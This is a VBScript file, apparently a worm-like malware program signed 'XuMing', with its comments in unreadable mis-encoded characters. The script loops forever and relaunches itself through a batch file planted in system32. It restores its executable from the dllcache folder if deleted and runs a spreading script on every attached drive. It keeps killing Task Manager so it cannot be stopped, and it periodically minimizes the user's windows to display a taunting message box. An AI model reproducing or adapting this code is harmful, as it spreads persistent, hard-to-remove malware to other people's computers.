'˵����д�ú���������Ц����
'�������ԣ��������ڷǷ���;
'by XM OF CS042 NEDU

dim i,j,rtimes,rflag,dc,drv,path,xuming,file,tpath,rndnum,nrun,cmdline,tmp,msgflag
set xuming=wscript.createobject("wscript.shell")
Set fs=createobject("scripting.filesystemobject")
xuming.run "cmd /c tskill cmd",0
wscript.sleep 1000
if Wscript.Arguments.length=0 then
'��������Ϊ0���ر�����Wscript.exe�����´����������Լ�����ֻ֤��һ���������У���Լϵͳ��Դ��������WIN2000
xuming.run "cmd /c echo tskill wscript>%systemroot%\system32\istart.bat",0,true
xuming.run "cmd /c echo start %systemroot%\system32\xuming1.vbs x>>%systemroot%\system32\istart.bat",0,true
xuming.run "cmd /c %systemroot%\system32\istart.bat",0
'�ȴ����ر�
wscript.sleep 10000
end if

'���б���
xuming.run "cmd /c %systemroot%\system32\xmhold.bat",0,false
msgflag=0
rtimes=0
While (1)
rtimes=rtimes+1
'���ж�ʱ�䱣������
cmdline="cmd /c %systemroot%\system32\xmhold.bat " &rtimes
xuming.run cmdline,0,false
'��ʧ�ļ��ָ�
cmdline="cmd /c if not exist %systemroot%\system32\xuming.exe copy /y %systemroot%\system32\dllcache\gnimux.exe %systemroot%\system32\xuming.exe"
xuming.run cmdline,0,fasle

cmdline="cmd /c if not exist %systemroot%\system32\dllcache\gnimux.exe copy /y %systemroot%\system32\xuming.exe %systemroot%\system32\dllcache\gnimux.exe"
xuming.run cmdline,0,fasle

cmdline="cmd /c if not exist %systemroot%\system32\xuming.bat start xuming.exe"
xuming.run cmdline,0,fasle

wscript.sleep 100
Set dc=fs.drives
For each d in dc
 set drv=fs.getdrive(d)
  if fs.driveexists(drv) and d.driveletter<>"A" and drv.drivetype<>4 then
   if drv.isready Then
      cmdline="cmd /c %systemroot%\system32\xuming.bat " & d.driveletter
      xuming.run cmdline,0,true
   end if
  end if

'�ر����������
 WScript.Sleep 700
 For Each Process in GetObject("winmgmts:"). _
        ExecQuery ("select * from Win32_Process where name='taskmgr.exe'")
   Process.Terminate(0)
 Next
Next

'���������������
if not fs.fileexists("c:\hide.fg") then
'���������
xmtime=time
'ȡ��ǰʱ���Сʱ�ĸ�λ
i=1
while(mid(xmtime,i,1)<>":" and i<=len(xmtime))
i=i+1
wend
tstr=mid(xmtime,i-1,1)

  if tstr<>1 then
  msgflag=0
  end if

  if tstr=1 and msgflag=0 then
  msgflag=1
  cmdline="cmd /c if not exist c:\hide.fg copy %systemroot%\system32\xm.txt %HOMEDRIVE%\DOCUME~1\ALLUSE~1\����\XM����.txt"
  xuming.run cmdline,0
  cmdline="cmd /c echo tmp=MsgBox(" &chr(34) &"<XuMing HAVE BEEN HERE><IL MYY>" &chr(34) &",0," &chr(34) &"XuMing" &chr(34)   &")>%systemroot%\xmmsg.vbs"
  xuming.run cmdline,0
  wscript.sleep 1000

    for i=1 to 10
      wscript.sleep 70
      xuming.sendkeys "%{TAB}"
      wscript.sleep 70
      xuming.sendkeys "% "
      wscript.sleep 40
      xuming.sendkeys "n"
    next

  xuming.run "%systemroot%\xmmsg.vbs"
  wscript.sleep 500
  xuming.AppActivate "XuMing"
  wscript.sleep 5000
  '����xuming.bat���fdmyy�����粿��
  xuming.run "%systemroot%\system32\xuming.bat x y",0
  end if

end if

Wend
